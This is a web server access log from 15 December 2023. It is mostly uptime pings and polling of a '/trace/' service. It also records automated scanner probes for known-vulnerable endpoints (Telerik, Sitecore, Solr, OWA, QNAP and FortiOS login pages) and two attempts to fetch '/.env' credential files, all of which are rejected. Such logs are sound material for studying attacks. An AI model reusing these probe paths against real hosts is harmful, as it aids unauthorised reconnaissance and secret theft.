167.71.120.76 - - [15/Dec/2023:00:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4001 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4002 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4003 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4004 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4005 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4006 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4007 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4008 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4009 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4010 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4011 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4012 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4013 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4014 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4015 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4016 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4017 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4018 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4019 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4020 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4021 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4022 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4023 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4024 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4025 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4026 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4027 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4028 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4029 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4030 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4031 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4032 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4033 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4034 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4035 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4036 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4037 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4038 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4039 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4040 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4041 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4042 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4043 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4044 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4045 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4046 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4047 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4048 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4049 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4050 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4051 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4052 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4053 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4054 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4055 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4056 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4057 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4058 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4059 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4060 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4061 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4062 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4063 "www@docker" "http://172.25.0.8:80" 0ms
45.156.128.7 - - [15/Dec/2023:00:36:40 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 19 "-" "-" 4064 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:37:02 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4065 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:00:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4066 "www@docker" "http://172.25.0.8:80" 1ms
45.156.128.7 - - [15/Dec/2023:00:37:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4067 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:37:27 +0000] "GET /sitecore/shell/sitecore.version.xml HTTP/1.1" 404 19 "-" "-" 4068 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:00:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4069 "www@docker" "http://172.25.0.8:80" 1ms
45.156.128.7 - - [15/Dec/2023:00:37:54 +0000] "GET /solr/ HTTP/1.1" 404 19 "-" "-" 4070 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:38:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4071 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:38:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4072 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:38:20 +0000] "GET /favicon-32x32.png HTTP/1.1" 404 19 "-" "-" 4073 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:38:21 +0000] "GET /api/session/properties HTTP/1.1" 404 19 "-" "-" 4074 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:00:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4075 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4076 "www@docker" "http://172.25.0.8:80" 0ms
45.156.128.7 - - [15/Dec/2023:00:38:50 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 4077 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:38:50 +0000] "GET /remote/login HTTP/1.1" 404 19 "-" "-" 4078 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:38:50 +0000] "GET /favicon/favicon.ico HTTP/1.1" 404 19 "-" "-" 4079 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:38:51 +0000] "GET /cgi-bin/config.exp HTTP/1.1" 404 19 "-" "-" 4080 "-" "-" 0ms
45.95.147.171 - - [15/Dec/2023:00:38:58 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4081 "web-to-websecure@internal" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:39:17 +0000] "GET /showLogin.cc HTTP/1.1" 404 19 "-" "-" 4082 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:00:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4083 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4084 "www@docker" "http://172.25.0.8:80" 0ms
45.156.128.7 - - [15/Dec/2023:00:39:45 +0000] "GET /admin/ HTTP/1.1" 404 19 "-" "-" 4085 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:39:45 +0000] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1" 404 19 "-" "-" 4086 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:40:15 +0000] "GET /owa/ HTTP/1.1" 404 19 "-" "-" 4087 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:40:15 +0000] "GET /sugar_version.json HTTP/1.1" 404 19 "-" "-" 4088 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:00:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4089 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4090 "www@docker" "http://172.25.0.8:80" 0ms
45.156.128.7 - - [15/Dec/2023:00:40:46 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 4091 "-" "-" 0ms
45.156.128.7 - - [15/Dec/2023:00:41:14 +0000] "GET /index.jsp HTTP/1.1" 404 19 "-" "-" 4092 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:00:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4093 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4094 "www@docker" "http://172.25.0.8:80" 0ms
45.156.128.7 - - [15/Dec/2023:00:41:45 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 19 "-" "-" 4096 "-" "-" 0ms
172.59.231.69 - - [15/Dec/2023:00:41:41 +0000] "GET /trace/ HTTP/2.0" 200 753 "-" "-" 4095 "livetrace@docker" "http://172.25.0.5:80" 5040ms
172.59.231.69 - - [15/Dec/2023:00:41:46 +0000] "GET /trace/start.php?id=1g96jacra HTTP/2.0" 200 103 "-" "-" 4097 "livetrace@docker" "http://172.25.0.5:80" 3ms
172.59.231.69 - - [15/Dec/2023:00:41:46 +0000] "GET /favicon.ico HTTP/2.0" 404 153 "-" "-" 4098 "www@docker" "http://172.25.0.8:80" 14ms
172.59.231.69 - - [15/Dec/2023:00:41:47 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4099 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:41:48 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4100 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:41:50 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4101 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:41:51 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4102 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:41:52 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4103 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:41:53 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4104 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:41:54 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4105 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:41:56 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4106 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.59.231.69 - - [15/Dec/2023:00:41:58 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4107 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:42:00 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4108 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:42:03 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4109 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.59.231.69 - - [15/Dec/2023:00:42:04 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 83 "-" "-" 4110 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:42:06 +0000] "GET /trace/poll.php?id=1g96jacra HTTP/2.0" 200 245 "-" "-" 4111 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4112 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4113 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4114 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4115 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4116 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4117 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4118 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4119 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4120 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4121 "www@docker" "http://172.25.0.8:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:46:40 +0000] "GET /who HTTP/2.0" 404 153 "-" "-" 4122 "www@docker" "http://172.25.0.8:80" 0ms
172.59.231.69 - - [15/Dec/2023:00:46:53 +0000] "GET /trace/ HTTP/2.0" 200 753 "-" "-" 4123 "livetrace@docker" "http://172.25.0.5:80" 7ms
172.59.231.69 - - [15/Dec/2023:00:46:53 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 4125 "livetrace@docker" "http://172.25.0.5:80" 0ms
172.59.231.69 - - [15/Dec/2023:00:46:53 +0000] "GET /trace/styles.css HTTP/2.0" 304 0 "-" "-" 4124 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:46:53 +0000] "GET /trace/start.php?id=doscwvo9z HTTP/2.0" 200 103 "-" "-" 4126 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.59.231.69 - - [15/Dec/2023:00:46:54 +0000] "GET /trace/poll.php?id=doscwvo9z HTTP/2.0" 200 83 "-" "-" 4127 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:46:55 +0000] "GET /trace/poll.php?id=doscwvo9z HTTP/2.0" 200 83 "-" "-" 4128 "livetrace@docker" "http://172.25.0.5:80" 2ms
172.59.231.69 - - [15/Dec/2023:00:46:56 +0000] "GET /trace/poll.php?id=doscwvo9z HTTP/2.0" 200 83 "-" "-" 4129 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:46:57 +0000] "GET /trace/poll.php?id=doscwvo9z HTTP/2.0" 200 83 "-" "-" 4130 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:46:58 +0000] "GET /trace/poll.php?id=doscwvo9z HTTP/2.0" 200 83 "-" "-" 4131 "livetrace@docker" "http://172.25.0.5:80" 1ms
172.59.231.69 - - [15/Dec/2023:00:46:59 +0000] "GET /trace/poll.php?id=doscwvo9z HTTP/2.0" 200 83 "-" "-" 4132 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4133 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4134 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4135 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4136 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4137 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4138 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4139 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4140 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4141 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4142 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4143 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4144 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4145 "www@docker" "http://172.25.0.8:80" 1ms
159.223.138.47 - - [15/Dec/2023:00:53:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4146 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:00:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4147 "www@docker" "http://172.25.0.8:80" 1ms
172.59.231.47 - - [15/Dec/2023:00:53:58 +0000] "GET /trace/poll.php?id=doscwvo9z HTTP/2.0" 200 245 "-" "-" 4148 "livetrace@docker" "http://172.25.0.5:80" 34ms
172.59.231.47 - - [15/Dec/2023:00:53:58 +0000] "GET /trace/poll.php?id=doscwvo9z HTTP/2.0" 200 245 "-" "-" 4149 "livetrace@docker" "http://172.25.0.5:80" 40ms
159.203.109.206 - - [15/Dec/2023:00:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4150 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4151 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4152 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4153 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4154 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [15/Dec/2023:00:56:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4155 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:00:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4156 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4157 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4158 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:00:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4159 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:00:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4160 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:00:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4161 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:00:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4162 "www@docker" "http://172.25.0.8:80" 0ms
54.37.79.75 - - [15/Dec/2023:01:00:08 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4163 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:01:00:08 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4164 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:01:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4165 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4166 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4167 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4168 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4169 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4170 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4171 "www@docker" "http://172.25.0.8:80" 0ms
57.129.23.166 - - [15/Dec/2023:01:03:27 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4172 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:01:03:28 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4173 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:01:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4174 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4175 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4176 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4177 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4178 "www@docker" "http://172.25.0.8:80" 0ms
